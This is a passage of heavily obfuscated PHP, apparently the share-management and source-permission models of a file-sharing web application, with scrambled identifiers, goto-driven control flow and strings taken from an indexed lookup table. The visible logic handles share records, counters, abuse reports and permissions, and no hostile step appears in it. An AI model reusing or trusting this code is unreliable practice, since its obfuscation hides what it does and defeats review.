$A‰ƒª˜Â[2229]); } if ($Fêë³Îœ’[$A‰ƒª˜Â[459]] == $A‰ƒª˜Â[93]) { Model($A‰ƒª˜Â[518])->eventShare($Aíºô¿–ÙÊ, $A‰ƒª˜Â[2230]); } return; } $B÷¸ÉÅ°ßš = $this->getInfoByPath($Aíºô¿–ÙÊ); goto a§²ŠÇ©»ö; F±ëã´‘æ‚: if ($B÷¸ÉÅ°ßš[$A‰ƒª˜Â[459]] == $A‰ƒª˜Â[481] && $Fêë³Îœ’[$A‰ƒª˜Â[459]] == $A‰ƒª˜Â[93]) { $D‹‰¶…ÎÊ = $A‰ƒª˜Â[2230]; } if ($B÷¸ÉÅ°ßš[$A‰ƒª˜Â[459]] == $A‰ƒª˜Â[93] && $Fêë³Îœ’[$A‰ƒª˜Â[459]] == $A‰ƒª˜Â[481]) { $D‹‰¶…ÎÊ = $A‰ƒª˜Â[2233]; } Model($A‰ƒª˜Â[518])->eventShare($Aíºô¿–ÙÊ, $D‹‰¶…ÎÊ); goto b­“ä¾ÁšŠ; C†ä«¿¦ò‰: } private function _addShareData($EëëƒÆ´î, $cÕİİùÄÛ = array()) { goto d¨²¡¿œ¨; EğŞ¥¹³Èí: $aÚİâ‘ùí¾ = array($fàêœˆå‰è[1416] => USER_ID, $fàêœˆå‰è[395] => $EëëƒÆ´î, $fàêœˆå‰è[1331] => $fàêœˆå‰è[43], $fàêœˆå‰è[457] => 0, $fàêœˆå‰è[459] => 0, $fàêœˆå‰è[1010] => $fàêœˆå‰è[43], $fàêœˆå‰è[308] => $fàêœˆå‰è[43], $fàêœˆå‰è[791] => $fàêœˆå‰è[43], $fàêœˆå‰è[2235] => 0, $fàêœˆå‰è[2236] => 0, $fàêœˆå‰è[460] => 0, $fàêœˆå‰è[461] => $fàêœˆå‰è[43], $fàêœˆå‰è[454] => $fàêœˆå‰è[43]); $Bô¬½¯ê¥ = explode($fàêœˆå‰è[57], $fàêœˆå‰è[2237]); foreach ($Bô¬½¯ê¥ as $dŞßßïä´‚) { if (!isset($cÕİİùÄÛ[$dŞßßïä´‚])) { continue; } $aÚİâ‘ùí¾[$dŞßßïä´‚] = $cÕİİùÄÛ[$dŞßßïä´‚]; } goto cêŸ¥§ÙØƒ; d¨²¡¿œ¨: $fàêœˆå‰è =& $_SERVER[¨¤¼…´]; $DÉĞÙĞ‘‰» = array($fàêœˆå‰è[395] => $EëëƒÆ´î, $fàêœˆå‰è[1416] => USER_ID); if ($EëëƒÆ´î == 0) { $DÉĞÙĞ‘‰» = array($fàêœˆå‰è[2234] => $cÕİİùÄÛ[$fàêœˆå‰è[1010]], $fàêœˆå‰è[1416] => USER_ID); } goto C°ˆÔ†â¨Á; cêŸ¥§ÙØƒ: $C¨³Üğ¾Âè = $this->add($aÚİâ‘ùí¾); $cÍ„òê“·” = array($fàêœˆå‰è[454] => short_id($C¨³Üğ¾Âè)); $this->where(array($fàêœˆå‰è[451] => $C¨³Üğ¾Âè))->save($cÍ„òê“·”); goto aæ«ùÁÜ‘; C°ˆÔ†â¨Á: if ($C‰Õ“ÄÑ¾Ã = $this->where($DÉĞÙĞ‘‰»)->find()) { return $C‰Õ“ÄÑ¾Ã[$fàêœˆå‰è[452]]; } if ($EëëƒÆ´î == 0) { $EÃ‘‚Ş”¤‹ = array($fàêœˆå‰è[38] => get_path_this($cÕİİùÄÛ[$fàêœˆå‰è[85]])); } else { $EÃ‘‚Ş”¤‹ = Model($fàêœˆå‰è[742])->sourceInfo($EëëƒÆ´î); if (!$EÃ‘‚Ş”¤‹) { return !1; } } if (!$cÕİİùÄÛ[$fàêœˆå‰è[1331]]) { $cÕİİùÄÛ[$fàêœˆå‰è[1331]] = $EÃ‘‚Ş”¤‹[$fàêœˆå‰è[38]]; } goto EğŞ¥¹³Èí; aæ«ùÁÜ‘: return $C¨³Üğ¾Âè; goto aó¨‘…š…; aó¨‘…š…: } private function _shareAuthSet($aÜ’ËÍöŒ…, $bÚªï‰‚Àˆ) { goto A²ÃÈÎª¿¯; A²ÃÈÎª¿¯: $FÅ”ƒÉÊŞ =& $_SERVER[¨¤¼…´]; if (!is_array($bÚªï‰‚Àˆ)) { return !1; } $f‚à«¸óÜ® = Model($FÅ”ƒÉÊŞ[2238]); goto B•ôö×Óâ˜; BÄè‡–Â›²: return $f‚à«¸óÜ®->addAll($dñ›Á•¡©Ô, array(), !0); goto E‡„‰øİÂÆ; B•ôö×Óâ˜: $f‚à«¸óÜ®->where(array($FÅ”ƒÉÊŞ[452] => $aÜ’ËÍöŒ…))->delete(); $dñ›Á•¡©Ô = array(); foreach ($bÚªï‰‚Àˆ as $D÷·¶Öê“) { $eÕœˆ¾Ğ = SourceModel::TYPE_USER; if ($D÷·¶Öê“[$FÅ”ƒÉÊŞ[383]] == SourceModel::TYPE_GROUP) { $eÕœˆ¾Ğ = SourceModel::TYPE_GROUP; } $F¯ù¼ƒæšÊ = array($FÅ”ƒÉÊŞ[452] => $aÜ’ËÍöŒ…, $FÅ”ƒÉÊŞ[383] => $eÕœˆ¾Ğ, $FÅ”ƒÉÊŞ[469] => intval($D÷·¶Öê“[$FÅ”ƒÉÊŞ[469]]), $FÅ”ƒÉÊŞ[2239] => 0, $FÅ”ƒÉÊŞ[2240] => -1); if ($D÷·¶Öê“[$FÅ”ƒÉÊŞ[2239]]) { $F¯ù¼ƒæšÊ[$FÅ”ƒÉÊŞ[2239]] = $D÷·¶Öê“[$FÅ”ƒÉÊŞ[2239]]; } else { if ($D÷·¶Öê“[$FÅ”ƒÉÊŞ[2240]]) { $F¯ù¼ƒæšÊ[$FÅ”ƒÉÊŞ[2240]] = $D÷·¶Öê“[$FÅ”ƒÉÊŞ[2240]]; } } $dñ›Á•¡©Ô[] = $F¯ù¼ƒæšÊ; } goto BÄè‡–Â›²; E‡„‰øİÂÆ: } public function numViewAdd($FåÓ·¦Æ ±) { $B‡¼Õİ†Í =& $_SERVER[¨¤¼…´]; $A¦»¢·±ÉØ = array($B‡¼Õİ†Í[451] => $FåÓ·¦Æ ±); $this->where($A¦»¢·±ÉØ)->setAdd($B‡¼Õİ†Í[2235]); } public function numDownloadAdd($eïİÓç»õ¯) { $câ¿¡à µ£ =& $_SERVER[¨¤¼…´]; $eß­’¿„‹ = array($câ¿¡à µ£[451] => $eïİÓç»õ¯); $this->where($eß­’¿„‹)->setAdd($câ¿¡à µ£[2236]); } protected function shareEdit($A¾º ¡¿»¶, $A‚ĞŸåİ¥) { goto fæËŒ–„®¦; FòöÖÙöš: if (isset($A‚ĞŸåİ¥[$bò§Øé½à[2228]])) { $this->_shareAuthSet($A¾º ¡¿»¶, $A‚ĞŸåİ¥[$bò§Øé½à[2228]]); } return !0; goto a‹Ë™âøßÜ; f¸¥ëä„‰·: $this->_checkLinkShare($A‚ĞŸåİ¥, $bô’Á‹×); $bá­ë¦£²ô = array(); $d’‚éÁè = explode($bò§Øé½à[57], $bò§Øé½à[2241]); goto a“ô“¹Ë—İ; fæËŒ–„®¦: $bò§Øé½à =& $_SERVER[¨¤¼…´]; $bô’Á‹× = $this->getInfo($A¾º ¡¿»¶); if (!$bô’Á‹×) { return !1; } goto f¸¥ëä„‰·; a“ô“¹Ë—İ: foreach ($d’‚éÁè as $d™ÃìÁØ°) { if (!array_key_exists($d™ÃìÁØ°, $A‚ĞŸåİ¥)) { continue; } $bá­ë¦£²ô[$d™ÃìÁØ°] = $A‚ĞŸåİ¥[$d™ÃìÁØ°]; } $this->shareEventAdd($bô’Á‹×[$bò§Øé½à[381]], $A‚ĞŸåİ¥, $bò§Øé½à[2062]); $this->where(array($bò§Øé½à[451] => $A¾º ¡¿»¶))->save($bá­ë¦£²ô); goto FòöÖÙöš; a‹Ë™âøßÜ: } private function _checkLinkShare($B—¼„éáãö, $D†¨˜¨†à¥) { goto D†Ó®›µæ; Eñä®ä‡Ô…: $fÁ¼Õõ®™³ = $this->shareFileMeta($aë÷•Áêó[$fÊÂ†’¨³[431]]); if (isset($fÁ¼Õõ®™³[$fÊÂ†’¨³[372]]) && $fÁ¼Õõ®™³[$fÊÂ†’¨³[372]] == $fÊÂ†’¨³[93]) { show_json(LNG($fÊÂ†’¨³[2244]), !1); } goto d‰Ù¨™¹; D†Ó®›µæ: $fÊÂ†’¨³ =& $_SERVER[¨¤¼…´]; if ($B—¼„éáãö[$fÊÂ†’¨³[457]] != $fÊÂ†’¨³[93]) { return; } $Eš¹ß’ª²£ = $D†¨˜¨†à¥[$fÊÂ†’¨³[403]][$fÊÂ†’¨³[381]]; goto AÏäÌŞ÷í§; AÏäÌŞ÷í§: if ($D†¨˜¨†à¥[$fÊÂ†’¨³[403]][$fÊÂ†’¨³[39]] != $fÊÂ†’¨³[181]) { $C¯©÷Œ’à  = $this->_folderReport($Eš¹ß’ª²£); if (!$C¯©÷Œ’à ) { return; } show_json(LNG($fÊÂ†’¨³[2242]) . $fÊÂ†’¨³[2243] . $C¯©÷Œ’à , !1); } $aë÷•Áêó = Model($fÊÂ†’¨³[742])->fileInfoGet($D†¨˜¨†à¥[$fÊÂ†’¨³[403]][$fÊÂ†’¨³[381]]); if (!$aë÷•Áêó) { return; } goto Eñä®ä‡Ô…; d‰Ù¨™¹: } private function _folderReport($b£à°àÓÉÕ) { goto f·Æ½Ãº»; D´¦¤á‘öò: $E¢ƒ´‹¨¹ª = array_to_keyvalue($a¸ôÛùçÄ—, $C‚òÈ á‘İ[43], $C‚òÈ á‘İ[38]); $E¢ƒ´‹¨¹ª[] = $cÂâŸíŸÁ[$C‚òÈ á‘İ[38]]; return implode($C‚òÈ á‘İ[8], $E¢ƒ´‹¨¹ª); goto B¬¡Å”‚Ä˜; dÌ³ßïÅÄ: $C½‡±¯ö™± = substr($cÂâŸíŸÁ[$C‚òÈ á‘İ[472]], strpos($cÂâŸíŸÁ[$C‚òÈ á‘İ[472]], $Bšß†„Şóœ)); $EõÔ·Ô« = array($C‚òÈ á‘İ[381] => array($C‚òÈ á‘İ[7], trim($C½‡±¯ö™±, $C‚òÈ á‘İ[57]))); $a¸ôÛùçÄ— = Model($C‚òÈ á‘İ[742])->where($EõÔ·Ô«)->field($C‚òÈ á‘İ[38])->select(); goto D´¦¤á‘öò; A‡ùğË’î•: $EõÔ·Ô« = array($C‚òÈ á‘İ[431] => array($C‚òÈ á‘İ[7], $eÜ†¦œá¥‡), $C‚òÈ á‘İ[472] => array($C‚òÈ á‘İ[741], "\x25{$Bšß†„Şóœ}\45"), $C‚òÈ á‘İ[409] => 0); $cÂâŸíŸÁ = Model($C‚òÈ á‘İ[742])->where($EõÔ·Ô«)->field($C‚òÈ á‘İ[2246])->find(); if (!$cÂâŸíŸÁ) { return !1; } goto dÌ³ßïÅÄ; C¡­‰£æé: if (!$eÜ†¦œá¥‡) { return !1; } $eÜ†¦œá¥‡ = array_to_keyvalue($eÜ†¦œá¥‡, $C‚òÈ á‘İ[43], $C‚òÈ á‘İ[431]); $Bšß†„Şóœ = $C‚òÈ á‘İ[57] . $b£à°àÓÉÕ . $C‚òÈ á‘İ[57]; goto A‡ùğË’î•; f·Æ½Ãº»: $C‚òÈ á‘İ =& $_SERVER[¨¤¼…´]; $EõÔ·Ô« = array($C‚òÈ á‘İ[431] => array($C‚òÈ á‘İ[912], 0), $C‚òÈ á‘İ[679] => 3); $eÜ†¦œá¥‡ = Model($C‚òÈ á‘İ[2245])->where($EõÔ·Ô«)->field($C‚òÈ á‘İ[431])->select(); goto C¡­‰£æé; B¬¡Å”‚Ä˜: } protected function remove($Däæ©ôÛô) { goto DšèŒ‹ŒñÀ; f´Ò‡ÓÓ’°: for ($cË´·‚»‚À = 0; $cË´·‚»‚À < count($e¦˜ËÚïé‚); $cË´·‚»‚À++) { $A¢‘×Ì‰­Û = $this->getInfo($e¦˜ËÚïé‚[$cË´·‚»‚À]); if ($A¢‘×Ì‰­Û[$E Å“Åˆ³ß[459]] == $E Å“Åˆ³ß[93]) { Model($E Å“Åˆ³ß[518])->eventShare($A¢‘×Ì‰­Û[$E Å“Åˆ³ß[381]], $E Å“Åˆ³ß[2233]); } if ($A¢‘×Ì‰­Û[$E Å“Åˆ³ß[457]] == $E Å“Åˆ³ß[93]) { Model($E Å“Åˆ³ß[518])->eventShare($A¢‘×Ì‰­Û[$E Å“Åˆ³ß[381]], $E Å“Åˆ³ß[2232]); } } return $aï×„¨·ç; goto d­§ëÒïÜÛ; A˜ÌèÎé…: $aï×„¨·ç = $this->where($A¹ˆí÷»’»)->delete(); if ($aï×„¨·ç) { Model($E Å“Åˆ³ß[549])->where(array($E Å“Åˆ³ß[452] => $Däæ©ôÛô))->delete(); } $e¦˜ËÚïé‚ = is_array($Däæ©ôÛô) ? $Däæ©ôÛô[1] : array($Däæ©ôÛô); goto f´Ò‡ÓÓ’°; DšèŒ‹ŒñÀ: $E Å“Åˆ³ß =& $_SERVER[¨¤¼…´]; if (is_array($Däæ©ôÛô)) { $Däæ©ôÛô = array($E Å“Åˆ³ß[7], $Däæ©ôÛô); } $A¹ˆí÷»’» = array($E Å“Åˆ³ß[452] => $Däæ©ôÛô); goto A˜ÌèÎé…; d­§ëÒïÜÛ: } protected function removeBySource($AŒÕ˜ ª’›) { goto f¢Â×ˆÆ‘œ; aÛºÌø…¼À: $c—‰¾†¥µà = array_to_keyvalue($c—‰¾†¥µà, $b’£ºë±¶›[43], $b’£ºë±¶›[452]); if (!$c—‰¾†¥µà) { return; } $D®‘’°µ¸¤ = array($b’£ºë±¶›[451] => array($b’£ºë±¶›[396], $c—‰¾†¥µà)); goto fá®¼¬çì‰; f¢Â×ˆÆ‘œ: $b’£ºë±¶› =& $_SERVER[¨¤¼…´]; $D®‘’°µ¸¤ = array($b’£ºë±¶›[395] => array($b’£ºë±¶›[396], $AŒÕ˜ ª’›)); $c—‰¾†¥µà = $this->field($b’£ºë±¶›[452])->where($D®‘’°µ¸¤)->select(); goto aÛºÌø…¼À; fá®¼¬çì‰: $this->where($D®‘’°µ¸¤)->delete(); Model($b’£ºë±¶›[549])->where($D®‘’°µ¸¤)->delete(); goto e„ÔÙ‚¸Ù; e„ÔÙ‚¸Ù: } public function listAll($EÎàòŒòöó) { goto Aõ¿ÏÜ¬¢•; b“ á¡ÃÉ: $C˜Ø„ñ¿ÓÕ = $this->_makeOrder()->where($A‘µ–®¥šù)->selectPage(20); if (empty($C˜Ø„ñ¿ÓÕ[$B²Ü¨ÄÌÁø[367]])) { return array(); } $this->_listDataApply($C˜Ø„ñ¿ÓÕ[$B²Ü¨ÄÌÁø[367]]); goto FÙãòëˆÃ; eÅ²è¼‚ˆè: if ($EÎàòŒòöó[$B²Ü¨ÄÌÁø[692]]) { $E†¢ŒÆ×®½ = $EÎàòŒòöó[$B²Ü¨ÄÌÁø[460]] ? $EÎàòŒòöó[$B²Ü¨ÄÌÁø[460]] : strtotime(date($B²Ü¨ÄÌÁø[2247])); $A‘µ–®¥šù[$B²Ü¨ÄÌÁø[201]] = array($B²Ü¨ÄÌÁø[334], array($EÎàòŒòöó[$B²Ü¨ÄÌÁø[692]], $E†¢ŒÆ×®½)); } if ($EÎàòŒòöó[$B²Ü¨ÄÌÁø[39]]) { $A‘µ–®¥šù[$EÎàòŒòöó[$B²Ü¨ÄÌÁø[39]]] = 1; } else { $A‘µ–®¥šù[] = array($B²Ü¨ÄÌÁø[457] => array($B²Ü¨ÄÌÁø[912], 0), $B²Ü¨ÄÌÁø[459] => array($B²Ü¨ÄÌÁø[912], 0), $B²Ü¨ÄÌÁø[2223] => $B²Ü¨ÄÌÁø[2180]); } if ($EÎàòŒòöó[$B²Ü¨ÄÌÁø[2176]]) { $A‘µ–®¥šù[] = array($B²Ü¨ÄÌÁø[454] => $EÎàòŒòöó[$B²Ü¨ÄÌÁø[2176]], $B²Ü¨ÄÌÁø[1331] => array($B²Ü¨ÄÌÁø[741], "\45{$EÎàòŒòöó[$B²Ü¨ÄÌÁø[2176]]}\45"), $B²Ü¨ÄÌÁø[2223] => $B²Ü¨ÄÌÁø[2180]); } goto b“ á¡ÃÉ; Aõ¿ÏÜ¬¢•: $B²Ü¨ÄÌÁø =& $_SERVER[¨¤¼…´]; $A‘µ–®¥šù = array(); if ($EÎàòŒòöó[$B²Ü¨ÄÌÁø[1425]]) { $A‘µ–®¥šù[$B²Ü¨ÄÌÁø[1425]] = $EÎàòŒòöó[$B²Ü¨ÄÌÁø[1425]]; } goto eÅ²è¼‚ˆè; FÙãòëˆÃ: return $C˜Ø„ñ¿ÓÕ; goto a…ÊÉ…µö¾; a…ÊÉ…µö¾: } public function listDataApply($c•Ó±©Ú¿¾) { $this->_listDataApply($c•Ó±©Ú¿¾); return $c•Ó±©Ú¿¾; } private function _listDataApply(&$CìÚçËñÑ„) { goto E˜Öåµ©ÁÓ; aŞ‘ƒò—Ù: $f¸¦Õ‹¬´¯ = array_to_keyvalue($CìÚçËñÑ„, $dÑÜõãÑ±[43], $dÑÜõãÑ±[381]); $fÒ±Íá±ªä = Model($dÑÜõãÑ±[742])->sourceListInfo($f¸¦Õ‹¬´¯, !0); foreach ($CìÚçËñÑ„ as &$EâÆù’“”™) { $dŸ»²Ê°¨‚ = $EâÆù’“”™[$dÑÜõãÑ±[1425]]; $EâÆù’“”™[$dÑÜõãÑ±[2248]] = $Eƒ´±æÈ[$dŸ»²Ê°¨‚] ? $Eƒ´±æÈ[$dŸ»²Ê°¨‚] : !1; $e•ğòº¦’› = $EâÆù’“”™[$dÑÜõãÑ±[381]]; $EâÆù’“”™[$dÑÜõãÑ±[403]] = $fÒ±Íá±ªä[$e•ğòº¦’›] ? $fÒ±Íá±ªä[$e•ğòº¦’›] : !1; } goto aä¾İ±’Ùô; aä¾İ±’Ùô: unset($EâÆù’“”™); goto fÉÜ°•«ì; E˜Öåµ©ÁÓ: $dÑÜõãÑ± =& $_SERVER[¨¤¼…´]; $fØÀä”¦‰Ê = array_to_keyvalue($CìÚçËñÑ„, $dÑÜõãÑ±[43], $dÑÜõãÑ±[1425]); $Eƒ´±æÈ = Model($dÑÜõãÑ±[490])->userListInfo(array_unique($fØÀä”¦‰Ê)); goto aŞ‘ƒò—Ù; fÉÜ°•«ì: } private function _makeOrder($b”‡ïà¦Œ‹ = '') { goto eğÁ´òëŒ¨; eğÁ´òëŒ¨: $E‰õŞ­…‰Ú =& $_SERVER[¨¤¼…´]; $eª°Â÷Ûï = array($E‰õŞ­…‰Ú[201], $E‰õŞ­…‰Ú[460], $E‰õŞ­…‰Ú[2235], $E‰õŞ­…‰Ú[2236]); $Fì¦Ğ´†™È = array($E‰õŞ­…‰Ú[414] => $E‰õŞ­…‰Ú[415], $E‰õŞ­…‰Ú[416] => $E‰õŞ­…‰Ú[417]); goto C‘”ãå¸É™; C‘”ãå¸É™: $BÇ‡ƒòÂ–â = Input::get($E‰õŞ­…‰Ú[419], $E‰õŞ­…‰Ú[7], $E‰õŞ­…‰Ú[401], $eª°Â÷Ûï); $aá¦«ÀÄ®È = Input::get($E‰õŞ­…‰Ú[420], $E‰õŞ­…‰Ú[7], $E‰õŞ­…‰Ú[2249], array($E‰õŞ­…‰Ú[2175], $E‰õŞ­…‰Ú[416])); $aá¦«ÀÄ®È = $Fì¦Ğ´†™È[$aá¦«ÀÄ®È]; goto f‰Ô©™Â‘; f‰Ô©™Â‘: $b”‡ïà¦Œ‹ = $b”‡ïà¦Œ‹ . "{$BÇ‡ƒòÂ–â}\x20{$aá¦«ÀÄ®È}"; return $this->order($b”‡ïà¦Œ‹); goto dÔ©†¿³Øö; dÔ©†¿³Øö: } public function reportAdd($fÏ©ÄÆ ½) { $B®¿µã‚Ìô =& $_SERVER[¨¤¼…´]; $bŸ¾º•Ç• = array($B®¿µã‚Ìô[452] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[452]], $B®¿µã‚Ìô[1425] => USER_ID); if (Model($B®¿µã‚Ìô[2245])->where($bŸ¾º•Ç•)->find()) { return !1; } $CÌ¢ó»í‚ = array($B®¿µã‚Ìô[452] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[452]], $B®¿µã‚Ìô[1331] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[1331]], $B®¿µã‚Ìô[381] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[381]], $B®¿µã‚Ìô[431] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[431]], $B®¿µã‚Ìô[1425] => USER_ID, $B®¿µã‚Ìô[39] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[39]], $B®¿µã‚Ìô[417] => $fÏ©ÄÆ ½[$B®¿µã‚Ìô[417]]); return Model($B®¿µã‚Ìô[2245])->add($CÌ¢ó»í‚); } public function reportList($e ƒ©Æœ÷£) { goto A¸ìŒÀÔ¯»; a¬àƒºŒ–‚: if (isset($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[39]]) && in_array($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[39]], array($c¯³ÚÀÜ¯[93], $c¯³ÚÀÜ¯[2250], $c¯³ÚÀÜ¯[2251], $c¯³ÚÀÜ¯[2252], $c¯³ÚÀÜ¯[1909]))) { $aô«óâ’£[$c¯³ÚÀÜ¯[39]] = $e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[39]]; } if (isset($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[679]]) && in_array($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[679]], array($c¯³ÚÀÜ¯[481], $c¯³ÚÀÜ¯[93], $c¯³ÚÀÜ¯[2250], $c¯³ÚÀÜ¯[2251]))) { $aô«óâ’£[$c¯³ÚÀÜ¯[679]] = $e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[679]]; } $fµ×ˆ­–ğî = Input::get($c¯³ÚÀÜ¯[420], $c¯³ÚÀÜ¯[7], $c¯³ÚÀÜ¯[2249], array($c¯³ÚÀÜ¯[2175], $c¯³ÚÀÜ¯[416])); goto bˆÉ‡ëÁ÷Ê; bˆÉ‡ëÁ÷Ê: $BÜ«õˆ‹È = array($c¯³ÚÀÜ¯[414] => $c¯³ÚÀÜ¯[415], $c¯³ÚÀÜ¯[416] => $c¯³ÚÀÜ¯[417]); $eêŠñÉØÂ¶ = $c¯³ÚÀÜ¯[2253] . $BÜ«õˆ‹È[$fµ×ˆ­–ğî]; $fÔ†¯„¿ñ = Model($c¯³ÚÀÜ¯[2245])->where($aô«óâ’£)->order($eêŠñÉØÂ¶)->selectPage(20); goto a†¤¥‘ø; a†¤¥‘ø: if (empty($fÔ†¯„¿ñ[$c¯³ÚÀÜ¯[367]])) { return array(); } $this->_listDataApply($fÔ†¯„¿ñ[$c¯³ÚÀÜ¯[367]]); return $fÔ†¯„¿ñ; goto AéÜª†ëÙ; A¸ìŒÀÔ¯»: $c¯³ÚÀÜ¯ =& $_SERVER[¨¤¼…´]; $aô«óâ’£ = array(); if ($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[692]]) { $eÉÌ‚öƒ» = $e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[460]] ? $e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[460]] : strtotime(date($c¯³ÚÀÜ¯[2247])); $aô«óâ’£[$c¯³ÚÀÜ¯[201]] = array($c¯³ÚÀÜ¯[334], array($e ƒ©Æœ÷£[$c¯³ÚÀÜ¯[692]], $eÉÌ‚öƒ»)); } goto a¬àƒºŒ–‚; AéÜª†ëÙ: } public function reportStatus($bìëÚñà¼º) { goto D™ËÓ¯ç†; aİ×êÒè©Ø: return $còÖ³ÉÊ¨Ö; goto C¢´äë·à«; CÜ˜¬å˜¤–: $còÖ³ÉÊ¨Ö = Model($F¡ë¢óŸœŸ[2245])->where($d•í¦Šƒ§š)->save($B”¤ÛäñŸÚ); if ($bìëÚñà¼º[$F¡ë¢óŸœŸ[679]] == $F¡ë¢óŸœŸ[2250]) { if ($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[431]] != $F¡ë¢óŸœŸ[481] && $this->shareFileMeta($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[431]])) { $this->shareFileMeta($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[431]], 0); } $this->remove($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[452]]); return !0; } if ($còÖ³ÉÊ¨Ö && $bìëÚñà¼º[$F¡ë¢óŸœŸ[679]] == $F¡ë¢óŸœŸ[2251]) { $b®º¬ˆˆ…¢ = $B”¤ÛäñŸÚ[$F¡ë¢óŸœŸ[679]] == $F¡ë¢óŸœŸ[2251] ? 1 : 0; $this->shareFileMeta($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[431]], $b®º¬ˆˆ…¢); $this->removeByFile($cõØå¼Ùà‘[$F¡ë¢óŸœŸ[431]]); } goto aİ×êÒè©Ø; D™ËÓ¯ç†: $F¡ë¢óŸœŸ =& $_SERVER[¨¤¼…´]; $d•í¦Šƒ§š = array($F¡ë¢óŸœŸ[379] => $bìëÚñà¼º[$F¡ë¢óŸœŸ[379]]); $cõØå¼Ùà‘ = Model($F¡ë¢óŸœŸ[2245])->where($d•í¦Šƒ§š)->field($F¡ë¢óŸœŸ[2254])->find(); goto aÂô†ãÜ››; aÂô†ãÜ››: if (!$cõØå¼Ùà‘) { return !1; } $B”¤ÛäñŸÚ = array($F¡ë¢óŸœŸ[679] => $bìëÚñà¼º[$F¡ë¢óŸœŸ[679]]); if ($bìëÚñà¼º[$F¡ë¢óŸœŸ[679]] == $F¡ë¢óŸœŸ[2251] && $cõØå¼Ùà‘[$F¡ë¢óŸœŸ[679]] == $F¡ë¢óŸœŸ[2251]) { $B”¤ÛäñŸÚ[$F¡ë¢óŸœŸ[679]] = 0; } goto CÜ˜¬å˜¤–; C¢´äë·à«: } private function removeByFile($A ¬êåÖÅ) { goto cĞ£¹ë×Ô×; AñÏ®Úâ: $eÀŞÇçºõá = array($bƒì†”ĞÓ‹[381] => array($bƒì†”ĞÓ‹[7], $Fø´Âë¨éµ), $bƒì†”ĞÓ‹[457] => 1); $D†±¢æÌ = Model($bƒì†”ĞÓ‹[2072])->where($eÀŞÇçºõá)->field($bƒì†”ĞÓ‹[452])->select(); if (empty($D†±¢æÌ)) { return; } goto F»¢îà®‡; F»¢îà®‡: $FÒÜ¿¨‹Ü = array_to_keyvalue($D†±¢æÌ, $bƒì†”ĞÓ‹[43], $bƒì†”ĞÓ‹[452]); $this->remove($FÒÜ¿¨‹Ü); goto bÒ‹´ƒÊæé; cĞ£¹ë×Ô×: $bƒì†”ĞÓ‹ =& $_SERVER[¨¤¼…´]; $D†±¢æÌ = Model($bƒì†”ĞÓ‹[742])->where(array($bƒì†”ĞÓ‹[431] => $A ¬êåÖÅ))->field($bƒì†”ĞÓ‹[381])->select(); $Fø´Âë¨éµ = array_to_keyvalue($D†±¢æÌ, $bƒì†”ĞÓ‹[43], $bƒì†”ĞÓ‹[381]); goto AñÏ®Úâ; bÒ‹´ƒÊæé: } private function shareFileMeta($bæµÊ’’÷ä, $AÙğòÉÌº = null) { $B”Îøì¼§ =& $_SERVER[¨¤¼…´]; $aó«™‚¯™ = array($B”Îøì¼§[431] => $bæµÊ’’÷ä, $B”Îøì¼§[99] => $B”Îøì¼§[2255]); if (is_null($AÙğòÉÌº)) { return Model($B”Îøì¼§[2256])->where($aó«™‚¯™)->find(); } $aó«™‚¯™[$B”Îøì¼§[372]] = $AÙğòÉÌº; Model($B”Îøì¼§[2256])->add($aó«™‚¯™, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\145\137\141\165\164\150"; public function getAuth($E£¸ìêˆÍ—) { goto DÜÇÑÀà’Ö; Eõƒù¦ô½½: $A®•…¯µ„‰ = $this->field($b“¥ÖôÀˆ)->order($f¸¯æ Ş·£[379])->where($CÁÊ°Åæ²Î)->select(); $aÒäÜ“¶Ç = array(); $eÉ±·–æ¡÷ = array(); goto fùËè‘ÄŞÇ; dãÔ±¬Ÿì: return $aÒäÜ“¶Ç; goto bŒÎä­ß¤Œ; fùËè‘ÄŞÇ: $CóºÙâ±å = 2 << 25; foreach ($A®•…¯µ„‰ as $dô‚Â‚·òé) { goto dàĞÜŒĞ™³; b¢¨°±´¿…: if ($dô‚Â‚·òé[$f¸¯æ Ş·£[383]] == SourceModel::TYPE_USER && $dô‚Â‚·òé[$f¸¯æ Ş·£[469]] == $f¸¯æ Ş·£[481]) { $fÜ™Á‹øò¸ = 0; } $eÉ±·–æ¡÷[] = $Cß´„ÊÎÁ²[$f¸¯æ Ş·£[388]] + $fÜ™Á‹øò¸; goto E®àÑ¥›²Ÿ; dàĞÜŒĞ™³: $Cß´„ÊÎÁ² = Model($f¸¯æ Ş·£[2258])->listData($dô‚Â‚·òé[$f¸¯æ Ş·£[2239]]); if (!$Cß´„ÊÎÁ²) { continue; } $aÒäÜ“¶Ç[] = $dô‚Â‚·òé; goto b’“ã‡¹‘§; b’“ã‡¹‘§: $fÜ™Á‹øò¸ = 0; if ($dô‚Â‚·òé[$f¸¯æ Ş·£[383]] == SourceModel::TYPE_GROUP) { $fÜ™Á‹øò¸ = $CóºÙâ±å * 2; } if ($dô‚Â‚·òé[$f¸¯æ Ş·£[383]] == SourceModel::TYPE_USER) { $fÜ™Á‹øò¸ = $CóºÙâ±å; } goto b¢¨°±´¿…; E®àÑ¥›²Ÿ: } array_multisort($eÉ±·–æ¡÷, SORT_DESC, $aÒäÜ“¶Ç); goto dãÔ±¬Ÿì; DÜÇÑÀà’Ö: $f¸¯æ Ş·£ =& $_SERVER[¨¤¼…´]; $b“¥ÖôÀˆ = $f¸¯æ Ş·£[2257]; $CÁÊ°Åæ²Î = array($f¸¯æ Ş·£[381] => $E£¸ìêˆÍ—); goto Eõƒù¦ô½½; 